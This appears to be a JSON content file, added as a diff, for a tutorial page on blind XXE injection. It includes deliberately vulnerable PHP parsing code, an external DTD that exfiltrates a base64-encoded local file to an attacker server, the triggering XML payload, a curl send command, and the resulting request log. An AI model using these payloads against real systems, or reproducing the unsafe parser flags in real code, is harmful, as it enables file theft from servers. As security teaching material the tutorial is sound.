@@ -1,0 +1,180 @@
+[
+  {
+    "id": "download-xxe-lab",
+    "type": "download",
+    "title": "XXE Practice Lab",
+    "text": "Download the vulnerable PHP lab and payload collection.",
+    "fileName": "xxe-lab.zip",
+    "url": "/downloads/xxe-lab.zip",
+    "size": "4kb"
+  },
+  {
+    "type": "section_heading",
+    "id": "blind-xxe-intro",
+    "text": "What is Blind XXE?"
+  },
+  {
+    "type": "order_block",
+    "id": "blind-definition",
+    "text": "Blind XXE occurs when the server parses attacker-controlled XML and expands external entities, but does NOT reflect the processed XML in the HTTP response."
+  },
+  {
+    "type": "section_heading",
+    "id": "blind-vulnerable-code",
+    "text": "Vulnerable PHP Code (Blind Scenario)"
+  },
+  {
+    "type": "code_block",
+    "id": "blind-php-code",
+    "language": "php",
+    "code": "<?php\n$xml = file_get_contents(\"php://input\");\n\n$dom = new DOMDocument();\n$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);\n\necho \"Processed\";\n?>"
+  },
+  {
+    "type": "order_block",
+    "id": "blind-analysis-code",
+    "text": "The XML is parsed with entity expansion enabled, but the processed XML is NOT returned. Therefore, entity output cannot be seen directly."
+  },
+  {
+    "type": "section_heading",
+    "id": "blind-step-1-setup-attacker",
+    "text": "Step 1 - Setup Attacker Server"
+  },
+  {
+    "type": "code_block",
+    "id": "attacker-server",
+    "language": "bash",
+    "code": "python3 -m http.server 9000"
+  },
+  {
+    "type": "section_heading",
+    "id": "blind-step-2-create-dtd",
+    "text": "Step 2 - Create External DTD (evil.dtd)"
+  },
+  {
+    "type": "code_block",
+    "id": "blind-evil-dtd",
+    "language": "xml",
+    "code": "<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/hostname\">\n<!ENTITY % evil \"<!ENTITY exfil SYSTEM 'http://127.0.0.1:9000/?data=%file;'>\">\n%evil;"
+  },
+  {
+    "type": "order_block",
+    "id": "blind-dtd-analysis",
+    "text": "%file reads and base64-encodes the target file. %evil dynamically creates a new entity that forces the server to send the file content to the attacker server."
+  },
+  {
+    "type": "section_heading",
+    "id": "blind-step-3-create-payload",
+    "text": "Step 3 - Create Blind Payload"
+  },
+  {
+    "type": "code_block",
+    "id": "blind-payload",
+    "language": "xml",
+    "code": "<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n<!ENTITY % xxe SYSTEM \"http://127.0.0.1:9000/evil.dtd\">\n%xxe;\n]>\n<root>&exfil;</root>"
+  },
+  {
+    "type": "order_block",
+    "id": "blind-payload-analysis",
+    "text": "The payload loads the external DTD from the attacker. The DTD injects the exfil entity. The &exfil; reference triggers the outbound request."
+  },
+  {
+    "type": "section_heading",
+    "id": "blind-step-4-send-payload",
+    "text": "Step 4 - Send Malicious XML"
+  },
+  {
+    "type": "code_block",
+    "id": "blind-send",
+    "language": "bash",
+    "code": "curl -X POST http://127.0.0.1:8000 \\\n  -H \"Content-Type: application/xml\" \\\n  --data-binary @payload.xml"
+  },
+  {
+    "type": "section_heading",
+    "id": "blind-step-5-observe-attacker",
+    "text": "Step 5 - Observe Outbound Request"
+  },
+  {
+    "type": "output_block",
+    "id": "blind-attacker-output",
+    "language": "text",
+    "code": "GET /evil.dtd HTTP/1.1\nGET /?data=QXppZAo= HTTP/1.1"
+  },
+  {
+    "type": "order_block",
+    "id": "blind-output-analysis",
+    "text": "The victim first requests evil.dtd. Then it sends a second request containing base64-encoded file data as a query parameter."
+  },
+  {
+    "type": "section_heading",
+    "id": "blind-execution-flow",
+    "text": "Execution Flow"
+  },
+  {
+    "type": "explanation",
+    "id": "blind-mechanism",
+    "title": "How Blind XXE Executes",
+    "items": [
+      "User sends malicious XML.",
+      "Server parses DOCTYPE (LIBXML_DTDLOAD enabled).",
+      "External DTD is fetched from attacker.",
+      "Parameter entities are expanded.",
+      "Dynamic exfil entity is created.",
+      "XML body references &exfil;.",
+      "Server makes outbound HTTP request with file data.",
+      "Attacker receives exfiltrated content."
+    ]
+  },
+  {
+    "type": "section_heading",
+    "id": "blind-required-conditions",
+    "text": "Required Conditions"
+  },
+  {
+    "type": "explanation",
+    "id": "blind-conditions",
+    "title": "Conditions for Blind XXE",
+    "items": [
+      "Application must parse XML input.",
+      "DOCTYPE processing must be enabled.",
+      "External entity expansion must be allowed.",
+      "Outbound network requests must be permitted.",
+      "Attacker-controlled server must be reachable."
+    ]
+  },
+  {
+    "type": "section_heading",
+    "id": "blind-why-base64",
+    "text": "Why Base64 Encoding is Used"
+  },
+  {
+    "type": "order_block",
+    "id": "blind-base64-explanation",
+    "text": "Raw file content may contain newlines and special characters that break the HTTP request. Base64 ensures safe transmission inside a URL."
+  },
+  {
+    "type": "section_heading",
+    "id": "blind-limitations",
+    "text": "Limitations"
+  },
+  {
+    "type": "explanation",
+    "id": "blind-limitations-list",
+    "title": "Common Practical Limitations",
+    "items": [
+      "URI length restrictions (large files fail).",
+      "Outbound traffic filtering may block exfiltration.",
+      "Modern parsers often disable DTD processing by default.",
+      "WAF may block suspicious DOCTYPE usage."
+    ]
+  },
+  {
+    "type": "section_heading",
+    "id": "blind-conclusion",
+    "text": "Conclusion"
+  },
+  {
+    "type": "order_block",
+    "id": "blind-summary",
+    "text": "Blind XXE allows attackers to extract sensitive data even when the application does not reflect parsed XML. Data exfiltration occurs through outbound requests triggered by entity expansion."
+  }
+]
